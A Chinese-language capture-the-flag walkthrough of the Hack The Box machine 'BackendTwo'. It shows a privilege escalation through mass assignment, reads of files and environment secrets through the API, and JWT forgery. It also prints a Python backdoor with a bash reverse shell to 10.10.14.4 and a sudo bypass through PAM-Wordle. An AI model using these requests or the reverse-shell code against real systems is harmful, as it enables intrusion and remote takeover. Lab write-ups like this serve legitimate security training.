## 解题流程

1\. 首先访问`/api`，使用扫描工具得到`/api/v1/user/signup`接口并成功注册用户
```
POST /api/v1/user/signup HTTP/1.1
Host: 10.10.11.162
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/json
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
Content-Length: 53

{"email":"adm@backendtwo.htb",
"password":"123456" }
```

2\. 接着登录用户得到`jwt`

```
POST /api/v1/user/login HTTP/1.1
Host: 10.10.11.162
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Sec-GPC: 1
Cache-Control: max-age=0
Content-Length: 43

username=adm@backendtwo.htb&password=123456

HTTP/1.1 200 OK
date: Sun, 15 May 2022 13:02:13 GMT
server: uvicorn
content-length: 302
content-type: application/json
Connection: close

{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUzMzEwOTM0LCJpYXQiOjE2NTI2MTk3MzQsInN1YiI6IjEzIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6ImM4NWY4YTkzLTMzNzgtNDYzOC1iM2Q4LTlhMWVmMDNkYWM3NSJ9.HTwKmJT2U3oiGz83P1C1PMelscxECh2NyEvbrwYBHfA","token_type":"bearer"}
```

3\. 然后使用`jwt`登录到`docs`页面，得到`api`列表
```
PUT /api/v1/user/13/password
/api/v1/user/{id}
/api/v1/user/14/edit
/api/v1/admin/get_user_flag
/api/v1/admin/file/L2hvbWUvaHRiL2FwcC9hcGkvdjEvZW5kcG9pbnRzL3VzZXIucHk=
POST /api/v1/admin/file/L2hvbWUvaHRiLy5zc2gveHh4
```

4\. 测试`edit`接口，试着去把`profile`参数修改成别的参数，但是失败了。但是如果我们保留`profil`，但是添加别的参数，即可成功提交

```
PUT /api/v1/user/13/edit HTTP/1.1
Host: 10.10.11.162
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/json
Sec-GPC: 1
Cache-Control: max-age=0
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUzMzEwOTM0LCJpYXQiOjE2NTI2MTk3MzQsInN1YiI6IjEzIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6ImM4NWY4YTkzLTMzNzgtNDYzOC1iM2Q4LTlhMWVmMDNkYWM3NSJ9.HTwKmJT2U3oiGz83P1C1PMelscxECh2NyEvbrwYBHfA
Content-Length: 53

{
  "profile":"UHC Player",
"is_superuser": true
}

HTTP/1.1 200 OK
date: Sun, 15 May 2022 13:08:04 GMT
server: uvicorn
content-length: 17
content-type: application/json
Connection: close

{"result":"true"}
```
```
http://10.10.11.162/api/v1/user/13

HTTP/1.1 200 OK
date: Sun, 15 May 2022 13:08:51 GMT
server: uvicorn
content-length: 175
content-type: application/json
Connection: close

{"guid":"c85f8a93-3378-4638-b3d8-9a1ef03dac75","email":"adm@backendtwo.htb","profile":"UHC Player","last_update":null,"time_created":1652619556509,"is_superuser":true,"id":13}
```


5\. 使用提权了的账户去访问`admin`接口，读取`flag`

```
GET /api/v1/admin/get_user_flag HTTP/1.1
Host: 10.10.11.162
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/json
Sec-GPC: 1
Cache-Control: max-age=0
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUzMzExMzY5LCJpYXQiOjE2NTI2MjAxNjksInN1YiI6IjEzIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYzg1ZjhhOTMtMzM3OC00NjM4LWIzZDgtOWExZWYwM2RhYzc1In0.8BrsavAdE5BdFFjdy_suLpNyeQJfEviP4WwO5QAWaCY
Content-Length: 0


HTTP/1.1 200 OK
date: Sun, 15 May 2022 13:10:29 GMT
server: uvicorn
content-length: 45
content-type: application/json
Connection: close

{"file":"38499ed84394229e6dea241aff08d1de\n"}
```


6\. 接着试着读取文件，在`URL`中读取文件，常见的方式是把文件名进行`base64`编码

```
http://10.10.11.162/api/v1/admin/file/L2V0Yy9wYXNzd2Q=
```

7\. 读取一些有用的文件

```json
# /proc/self/cmdline
{"file":"/usr/bin/python3\u0000-c\u0000from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7)\u0000--multiprocessing-fork\u0000"}

# /proc/self/environ
{"file":"USER=htb\u0000HOME=/home/htb\u0000OLDPWD=/\u0000PORT=80\u0000LOGNAME=htb\u0000JOURNAL_STREAM=9:22695\u0000APP_MODULE=app.main:app\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000INVOCATION_ID=e251c2f543c248f689505ee2c90bca0a\u0000LANG=C.UTF-8\u0000API_KEY=68b329da9893e34099c7d8ad5cb9c940\u0000HOST=0.0.0.0\u0000PWD=/home/htb\u0000"}

# /proc/self/stat
{"file":"914 (python3) R 904 903 903 0 -1 4194304 23850 102 1 0 8018 745 0 0 20 0 2 0 1659 309379072 17251 18446744073709551615 4194304 7042053 140734475804352 0 0 0 0 16781312 16386 0 0 0 17 1 0 0 8 0 0 9395632 9685776 27258880 140734475808320 140734475808449 140734475808449 140734475808743 0\n"}
```

从`cmdline`中可以看出，`app`运行的时候`fork`了一个子进程出来，所以我们读取`stat`文件来获取父进程的`PID=904`

```bash
# /proc/904/cmdline
{"file":"/usr/bin/python3\u0000/home/htb/.local/bin/uvicorn\u0000--reload\u0000--host\u00000.0.0.0\u0000--port\u000080\u0000app.main:app\u0000"}
```

从上面得知`app`运行方式加载了`--reload`参数，说明每隔一段时间就会加载`py`文件

8\. 尝试上传文件，但是需要设置`debug`载荷，首先去读取`jwt`的加密密钥，得到加密密钥保存在环境变量中

```
API_KEY=68b329da9893e34099c7d8ad5cb9c940
```

9\. 使用`API_KEY`伪造`JWT`来上传文件，可以修改某个`py`文件上传覆盖，然后等待服务器重新加载的时候，执行我们的`payload`

可以修改`user.py`文件，当指定一个不存在的`userid`的时候，执行反弹`shell`

```python
// http://10.10.11.162/api/v1/admin/file/L2hvbWUvaHRiL2FwcC9hcGkvdjEvZW5kcG9pbnRzL3VzZXIucHk=

@router.get(\"/{user_id}\", status_code=200, response_model=schemas.User)
def fetch_user(*, 
    user_id: int, 
    db: Session = Depends(deps.get_db) 
    ) -> Any:
    \"\"\"
    Fetch a user by ID
    \"\"\"
    if user_id == -1000:
        import os
        os.system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.4/12345 0>&1\"')
    result = crud.user.get(db=db, id=user_id)
    return result
```

10\. 获得一个反弹`shell`，使用得到的密码尝试登陆`htb`用户
```
cat auth.log
05/15/2022, 10:35:40 - Login Success for admin@htb.local
05/15/2022, 10:39:00 - Login Success for admin@htb.local
05/15/2022, 10:52:20 - Login Success for admin@htb.local
05/15/2022, 10:55:40 - Login Success for admin@htb.local
05/15/2022, 11:00:40 - Login Success for admin@htb.local
05/15/2022, 11:04:00 - Login Success for admin@htb.local
05/15/2022, 11:17:20 - Login Success for admin@htb.local
05/15/2022, 11:25:40 - Login Success for admin@htb.local
05/15/2022, 11:27:20 - Login Success for admin@htb.local
05/15/2022, 11:34:00 - Login Success for admin@htb.local
05/15/2022, 11:42:20 - Login Failure for 1qaz2wsx_htb!

```

11\. 尝试提权

```bash
htb@BackendTwo:~$ sudo -l
[sudo] password for htb: 
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.

--- Attempt 1 of 6 ---
Word: 

```

搜索关键字得到项目`https://github.com/lukem1/pam-wordle`，得知验证时候会加载`pam_wordlie.so`文件，该文件保存在`/usr/lib/x86_64-linux-gnu/security/pam_wordle.so`


同时从 [源码](https://github.com/lukem1/pam-wordle/blob/main/wordle.c#L28) 中得知该文件会加载一个字典文件，所以我们需要找到这个字典

```
htb@BackendTwo:/etc/pam.d$ ls
atd             common-password                other      su
chfn            common-session                 passwd     su-l
chpasswd        common-session-noninteractive  polkit-1   sudo
chsh            cron                           runuser    systemd-user
common-account  login                          runuser-l  vmtoolsd
common-auth     newusers                       sshd
htb@BackendTwo:/etc/pam.d$ cat sudo 
#%PAM-1.0

session    required   pam_env.so readenv=1 user_readenv=0
session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
auth    required pam_unix.so
auth    required    pam_wordle.so
@include common-auth
@include common-account
@include common-session-noninteractive
```

使用`strings`命令得到一些信息，字典保存在`/opt/.words`中
```
--- Attempt %d of %d ---
You lose.
The word was: %s
;*3$"
/opt/.words
```

运行`sudo -l`，首先尝试`write`

```
--- Attempt 1 of 6 ---
Word: write
Hint->?**??
--- Attempt 2 of 6 ---
Word: 
```

说明存在`r`和`i`两个字母，不存在`wte`字母，那么我们可以使用`grep`找出符合的字母有哪些
```bash
➜  /tmp cat word.txt | grep r | grep i | grep -vE '(w|t|e)'
chdir
mkdir
rmdir
virus

--- Attempt 1 of 6 ---
Word: write
Hint->?**??
--- Attempt 2 of 6 ---
Word: mkdir
Hint->??dir
--- Attempt 3 of 6 ---
Word: rmdir
Hint->??dir
--- Attempt 4 of 6 ---
Word: chdir
Correct!
Matching Defaults entries for htb on backendtwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb may run the following commands on backendtwo:
    (ALL : ALL) ALL     # 可以运行所有命令


root@BackendTwo:~# cat root.txt 
aefb7cb3f6e492876e0eeb7fdc5ec1e4
```

## 参考链接
[https://0xdf.gitlab.io/2022/05/02/htb-backendtwo.html](https://0xdf.gitlab.io/2022/05/02/htb-backendtwo.html)